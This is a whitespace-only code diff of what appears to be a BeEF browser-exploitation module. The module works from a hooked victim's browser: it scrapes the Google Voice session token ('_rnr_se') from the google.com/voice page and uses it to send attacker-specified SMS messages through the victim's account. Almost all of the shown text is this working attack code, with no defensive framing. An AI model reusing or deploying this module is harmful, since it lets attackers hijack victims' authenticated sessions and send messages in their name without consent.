@@ -9,7 +9,7 @@ beef.execute(function() {
 		var message = "<%= @message %>";
 		var status;
 		var regSMS = "('_rnr_se': ')([a-zA-Z0-9\+=]+)";//?(',)"
-		
+
 		function sendSMSNOW(message,number,token){
 				token = token.replace("+","%2b").replace("=","%3d");
 				var sendMessage = new XMLHttpRequest();
@@ -24,20 +24,20 @@ beef.execute(function() {
 						status = "ERROR. Something went wrong. Make sure you prefix the number with the country code.";
 				}
 		}
-		
+
 		function sendSMS(message,number) {
 				var client = new XMLHttpRequest();
 				client.open("GET", "https://www.google.com/voice" ,false);
 				client.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
 				client.send();
-		
+
 				var re = new RegExp(regSMS);
 				var m = re.exec(client.responseText);
 				if (m != null) {
 				//return m[2];
 				sendSMSNOW(message,number,m[2]);
 			}
-		}	
+		}
 
 
 		sendSMS(message,to);
